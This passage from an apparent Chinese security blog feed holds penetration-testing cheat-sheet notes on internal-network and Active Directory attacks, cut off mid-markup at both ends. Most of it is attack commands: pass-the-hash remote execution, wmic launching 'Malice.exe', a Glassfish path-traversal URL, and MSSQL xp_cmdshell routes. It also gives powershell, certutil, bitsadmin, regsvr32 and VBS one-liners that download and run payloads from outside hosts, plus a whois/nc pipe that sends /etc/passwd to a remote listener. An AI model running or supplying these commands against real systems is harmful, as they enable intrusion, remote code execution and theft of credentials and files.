class="line">administrator@192.168.3.133n</span><br><span class="line">DCOMEXEC</span><br><span class="line">python dcomexec.py -hashes</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07</span><br><span class="line">administrator@192.168.3.133</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="WinRm"><a href="#WinRm" class="headerlink" title="WinRm"></a>WinRm</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:COMPUTER COMMAND</span><br><span class="line">Invoke-Command - computername $COMPUTER -command &#123; $COMMAND&#125;</span><br><span class="line">New-PSSession -Name PSCOMPUTER - ComputerName $COMPUTER; Enter-PSSession -</span><br><span class="line">Name PSCOMPUTER</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="Remote-File-Upload"><a href="#Remote-File-Upload" class="headerlink" title="Remote File Upload"></a>Remote File Upload</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy C:\windows\Temp\Malice.exe \\target.domain\C$\Windows\Temp</span><br><span class="line">wmic &#x2F;node:target.domain &#x2F;user:domain\user &#x2F;password:password process call</span><br><span class="line">create &quot;C:\Windows\Temp\Malice.exe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用服务横向"><a href="#利用服务横向" class="headerlink" title="利用服务横向"></a>利用服务横向</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Web 中间件</span><br><span class="line">Web框架</span><br><span class="line">Web服务器</span><br><span class="line">运维系统</span><br><span class="line">邮件系统</span><br><span class="line">数据库</span><br><span class="line">常见服务&#x2F;协议</span><br><span class="line">Web 中间件</span><br><span class="line">Tomcat</span><br><span class="line">管理后台部署 war 后门文件</span><br><span class="line">Jboss</span><br><span class="line">(1)弱口令、部署war包(2)RCE</span><br><span class="line">Weblogic</span><br><span class="line">(1)弱口令、部署war包(2)反序列化</span><br><span class="line">WebSphere</span><br><span class="line">(1)弱口令部署war包(2)反序列化</span><br><span class="line">Glassfish</span><br><span class="line">远程文件包含</span><br><span class="line">http:&#x2F;&#x2F;1.2.3.4:4848&#x2F;theme&#x2F;META-</span><br><span class="line">INF&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-</span><br><span class="line">keyfile</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Web框架"><a href="#Web框架" class="headerlink" title="Web框架"></a>Web框架</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Spring</span><br><span class="line">(1)RCE (2)目录穿越 (3) 反序列化</span><br><span class="line">Struts2</span><br><span class="line">S2-005 ... S2-507</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运维平台"><a href="#运维平台" class="headerlink" title="运维平台"></a>运维平台</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Gitlab</span><br><span class="line">(1)任意用户Token泄露(2)任意文件读取</span><br><span class="line">Jenkins</span><br><span class="line">(1)RCE linux (2)反序列化 (3)未授权访问 (4)弱口令、后台getshellZabbix</span><br><span class="line">(1)SQL注入 (2) RCE</span><br><span class="line">Splunk</span><br><span class="line">(1)信息泄露 (2)命令注入 (3)SSRF(弱口令)</span><br><span class="line">数据库</span><br><span class="line">MYSQL</span><br><span class="line">弱口令写shell</span><br><span class="line">MSSQL (重点讲)</span><br><span class="line">Oracle</span><br><span class="line">PostgreSQL</span><br><span class="line">(1)弱口令 (2) SQL注入 (3)udf执行命令 (4)文件读写</span><br><span class="line">MongoDB</span><br><span class="line">未授权</span><br><span class="line">Redis</span><br><span class="line">未授权访问+配合ssh key提权</span><br><span class="line">数据库-MSSQL</span><br><span class="line">文件读取</span><br><span class="line">(1)读:bulk insert、openRowSet、sp_oacreate</span><br><span class="line">(2)写:sp_oacreate、bulk insert error copy、textcopy (mssql 2005后消失)</span><br><span class="line">命令执行</span><br><span class="line">xp_cmdshell</span><br><span class="line">SP_OACREATE</span><br><span class="line">(1) CLISD (2) VBScript</span><br><span class="line">CLR Assemblies</span><br><span class="line">(1) from dll (2) from hex</span><br><span class="line">AgentJob</span><br><span class="line">(1)powershell (2) cmd (3) js (4) vbs</span><br><span class="line">Extended Stored Procedure</span><br><span class="line">JetEngine Sandbox常见服务&#x2F;协议</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="内网渗透-域渗透"><a href="#内网渗透-域渗透" class="headerlink" title="内网渗透-域渗透"></a>内网渗透-域渗透</h4><p>域渗透常见姿势</p><ul><li>AD Recon</li><li>AD Privilege Escalation</li><li>Forged Kerberos Tickets</li><li>Credential Access</li><li>Lateral Movement</li><li>Kerberos (AD) Attacks</li><li>AD Persistence</li></ul><h5 id="AD-Recon"><a href="#AD-Recon" class="headerlink" title="AD Recon"></a>AD Recon</h5><p><img src="/images/pasted-57.png" alt="upload successful"></p><h5 id="Recan-Without-Admin-Rights"><a href="#Recan-Without-Admin-Rights" class="headerlink" title="Recan Without Admin Rights"></a>Recan Without Admin Rights</h5><p>.Net<br>例:<a href="https://adsecurity.org/?p=113">https://adsecurity.org/?p=113</a></p><p><img src="/images/pasted-58.png" alt="upload successful"></p><h5 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SPN是服务在使用Kerberos身份验证的网络上唯一标识符。它由服务类,主机名和端口组成。在使用</span><br><span class="line">Kerberos身份验证的网络中,必须在内置计算机账户(如NetworkService或LocalSystem)或用户账户</span><br><span class="line">下对于内置账户,SPN将自动进行注册。但是,如果在域用户账户下运行服务,则必须为要使用的账户</span><br><span class="line">手动注册SPN。</span><br><span class="line">SPN分为两种:</span><br><span class="line">注册在AD上机器账户(Computers$):Local System或Network Service</span><br><span class="line">注册在域用户账户(Users)下:权限为一个域用户</span><br><span class="line">SPN结构</span><br><span class="line">&#x2F;:</span><br><span class="line">service class:服务组件类型</span><br><span class="line">hostname:计算机的FQDN</span><br><span class="line">port:端口号</span><br><span class="line">SPN列表:</span><br><span class="line">https:&#x2F;&#x2F;adsecurity.org&#x2F;?page_id&#x3D;183</span><br></pre></td></tr></table></figure><h5 id="Kerberos-amp-SPN-Scanning"><a href="#Kerberos-amp-SPN-Scanning" class="headerlink" title="Kerberos &amp; SPN Scanning"></a>Kerberos &amp; SPN Scanning</h5><p><img src="/images/pasted-59.png" alt="upload successful"></p><h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><p><img src="/images/pasted-60.png" alt="upload successful"></p><h5 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h5><p><img src="/images/pasted-61.png" alt="upload successful"></p><h5 id="AD-Privilege-Escalation"><a href="#AD-Privilege-Escalation" class="headerlink" title="AD Privilege Escalation"></a>AD Privilege Escalation</h5><p>待补充</p><h5 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h5><p><img src="/images/pasted-62.png" alt="upload successful"></p><h5 id="GoldenPAC-MS14-068"><a href="#GoldenPAC-MS14-068" class="headerlink" title="GoldenPAC (MS14-068)"></a>GoldenPAC (MS14-068)</h5><p><img src="/images/pasted-63.png" alt="upload successful"></p><p><img src="/images/pasted-64.png" alt="upload successful"></p><h5 id="DNSAdmins-to-Domain-Admin"><a href="#DNSAdmins-to-Domain-Admin" class="headerlink" title="DNSAdmins to Domain Admin"></a>DNSAdmins to Domain Admin</h5><p><img src="/images/pasted-65.png" alt="upload successful"></p><h5 id="GPP-MS14-025"><a href="#GPP-MS14-025" class="headerlink" title="GPP(MS14-025)"></a>GPP(MS14-025)</h5><p><img src="/images/pasted-66.png" alt="upload successful"></p><p><img src="/images/pasted-67.png" alt="upload successful"></p><p><img src="/images/pasted-71.png" alt="upload successful"></p><h5 id="Attack-NTDS-dit"><a href="#Attack-NTDS-dit" class="headerlink" title="Attack NTDS.dit"></a>Attack NTDS.dit</h5><p><img src="/images/pasted-69.png" alt="upload successful"></p><h5 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h5><p><img src="/images/pasted-68.png" alt="upload successful"></p><h5 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h5><p><img src="/images/pasted-70.png" alt="upload successful"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 hasdes@123 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-步步为营</title>
      <link href="2021/06/22/nei-wang-shen-tou-bu-bu-wei-ying/"/>
      <url>2021/06/22/nei-wang-shen-tou-bu-bu-wei-ying/</url>
      
        <content type="html"><![CDATA[<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><h5 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">基础Web漏洞(弱口令、文件上传、文件包含、RCE、反序列化)</span><br><span class="line">各类基础服务0&#x2F;1&#x2F;N Day RCE( vsftpd、Samba、fastcgi、)</span><br><span class="line">个人机(钓鱼打点)</span><br><span class="line">供应链攻击</span><br><span class="line">VPN、VNC、TV等</span><br><span class="line">0&#x2F;1day</span><br><span class="line">网络位置判断</span><br><span class="line">内网</span><br><span class="line">DMZ</span><br><span class="line">外网</span><br><span class="line">主机角色</span><br><span class="line">运维</span><br><span class="line">行政</span><br><span class="line">连通性判断</span><br><span class="line">icmp</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">出网测试</span><br><span class="line">exe or ps1</span><br><span class="line">Tcp&#x2F;Udp、Http&#x2F;Https、Dns、icmp</span><br><span class="line">Port or Socket</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Recon-信息收集"><a href="#Recon-信息收集" class="headerlink" title="Recon(信息收集)"></a>Recon(信息收集)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Work Group or Domain</span><br><span class="line">Domain Admin or !Admin</span><br><span class="line">Command or Secret File</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主机发现</p><p><img src="/images/pasted-54.png" alt="upload successful"></p><h5 id="Work-Group-工作组"><a href="#Work-Group-工作组" class="headerlink" title="Work Group(工作组)"></a>Work Group(工作组)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">Administrator</span><br><span class="line">User</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Domain-域"><a href="#Domain-域" class="headerlink" title="Domain(域)"></a>Domain(域)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Domain User</span><br><span class="line">Domain Admin</span><br><span class="line">User-Hunter</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">权限信息</span><br><span class="line">机器信息</span><br><span class="line">进程端口</span><br><span class="line">网络连接</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库配置文件</span><br><span class="line">SMB共享</span><br><span class="line">浏览器历史记录、书签、保存密码</span><br></pre></td></tr></table></figure><h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ARP(netdiscover、Powershell)</span><br><span class="line">NbtStat(nbtscan)</span><br><span class="line">本地HOST文件</span><br><span class="line">DNS缓存</span><br><span class="line">TCP</span><br><span class="line">UDP</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="搭建下载服务器"><a href="#搭建下载服务器" class="headerlink" title="搭建下载服务器"></a>搭建下载服务器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python(2.7 、3) &#x3D;&gt;开启 python服务器 &#x3D;&gt;python -m SimpleHTTPServer</span><br><span class="line">PHP</span><br><span class="line">apache2</span><br><span class="line">perl</span><br><span class="line">ruby</span><br><span class="line">TFTP</span><br><span class="line">tips:</span><br><span class="line">查看端口是否开启成功</span><br><span class="line">netstat -tunlp</span><br><span class="line">下载文件</span><br><span class="line">wget ip地址:端口&#x2F;文件名</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Windows-文件下载"><a href="#Windows-文件下载" class="headerlink" title="Windows 文件下载"></a>Windows 文件下载</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">nc</span><br><span class="line">VBS</span><br><span class="line">certutil</span><br><span class="line">bitsadmin (win03没有,win08及以上有)</span><br><span class="line">regsvr32</span><br><span class="line">FTP</span><br><span class="line">TFTP</span><br></pre></td></tr></table></figure><h6 id="Windows下载文件"><a href="#Windows下载文件" class="headerlink" title="Windows下载文件"></a>Windows下载文件</h6><p>powershell: download and execute</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object</span><br><span class="line">System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe&#39;,&#39;c:\download\a.exe&#39;);s</span><br><span class="line">tart-process &#39;c:\download\a.exe&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Powershell2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo $storageDir &#x3D; $pwd &gt; wget.ps1</span><br><span class="line">echo $webclient &#x3D; New-Object System.Net.WebClient &gt;&gt;wget.ps1</span><br><span class="line">echo $url &#x3D; &quot;http:&#x2F;&#x2F;192.168.1.101&#x2F;file.exe&quot; &gt;&gt;wget.ps1</span><br><span class="line">echo $file &#x3D; &quot;output-file.exe&quot; &gt;&gt;wget.ps1</span><br><span class="line">echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NoLogo -NoInteractive -NoProfile -File</span><br><span class="line">wget.ps1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>certutil: download and execute</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe</span><br><span class="line">c:\download\a.exe&amp;&amp;c:\download\a.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bitsadmin: download and execute</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe c:\download\a.exe &amp;&amp;</span><br><span class="line">c:\download\a.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>regsvr32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe scrobj.dl</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>VBS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRE &#x3D; 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArroy,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; CreateObject(&quot;Winhttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest&quot;)</span><br><span class="line">&gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt;</span><br><span class="line">wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;</span><br><span class="line">wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArroy &#x3D; http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData &#x3D; &quot;&quot; &gt;&gt; wget.vbsecho strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br><span class="line">cscript wget.vbs http:&#x2F;&#x2F;192.168.10.5&#x2F;evil.exe evil.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h6><p>1、搭建SMB服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syntax:impacker-smbserver ShareName SharePath</span><br><span class="line">$ mkdir smb # 创建 smb 目录</span><br><span class="line">$ cd smb # 进入 smb目录</span><br><span class="line">$ impacket-smbserver share &#39;pwd&#39; # 在当前目录启动 SMB server,共享名称为 share</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、从SMB Server下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\IP\ShareName\file.exe file.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、上传文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\IP\ShareName</span><br><span class="line">copy file.txt x:</span><br><span class="line">net use x: &#x2F;delete</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.1.101 21&gt; ftp.txt</span><br><span class="line">echo USER asshat &gt;&gt; ftp.txt</span><br><span class="line">echo mysecretpassword &gt;&gt; ftp.txt</span><br><span class="line">echo bin&gt;&gt; ftp.txt</span><br><span class="line">echo GET wget.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye&gt;&gt; ftp.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TFTP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">启动服务:</span><br><span class="line">atftpd --doemon --port 69 &#x2F;tftp</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;atftpd restart</span><br><span class="line">存放位置:</span><br><span class="line">&#x2F;srv&#x2F;tftp</span><br><span class="line">tftp -i 192.160.1.101 GET wget.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Linux文件传输"><a href="#Linux文件传输" class="headerlink" title="Linux文件传输"></a>Linux文件传输</h4><p>whois传输机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whois -h ip -p 4444 &#39;cat &#x2F;etc&#x2F;passwd | base64</span><br><span class="line">接收机</span><br><span class="line">nc -l -v -p 4444 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>base</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat file2upload | base64</span><br><span class="line">转换文件到base64</span><br><span class="line">cat fileWithBase64Content | base64 -d &gt; finalBinary</span><br><span class="line">base64到文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Curl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;1.2.3.4&#x2F;backdoor</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Wget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;1.2.3.4&#x2F;backdoor</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php</span><br><span class="line">file_put_content(&#39;nameOfFile&#39;,fopen(&#39;http:&#x2F;&#x2F;192.168.1.102&#x2F;file&#39;,&#39;r&#39;)); ?&gt;&quot; &gt;</span><br><span class="line">down2.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>FTP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line">python -m pyftpdlib -p 21</span><br><span class="line">wget ftp:&#x2F;&#x2F;10.11.0.117&#x2F;22.sh -P &#x2F;tmp&#x2F;</span><br><span class="line">wget ftp:&#x2F;&#x2F;ip:port&#x2F;software&#x2F;os&#x2F;ubuntu12.04&#x2F;ubuntu-12.04.1-server-amd64.iso --</span><br><span class="line">ftp-user&#x3D;username --ftp-password&#x3D;password</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TFTP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tftp 192.168.0.101</span><br><span class="line">tftp&gt; get myfile.txt</span><br><span class="line">非交互式:</span><br><span class="line">tftp 191.168.0.101 &lt;&lt;&lt; &quot;get shell5555.php shell5555.php&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SSH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建密钥对</span><br><span class="line">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class="line">写入公钥:</span><br><span class="line">echo &quot;ssh-rsa</span><br><span 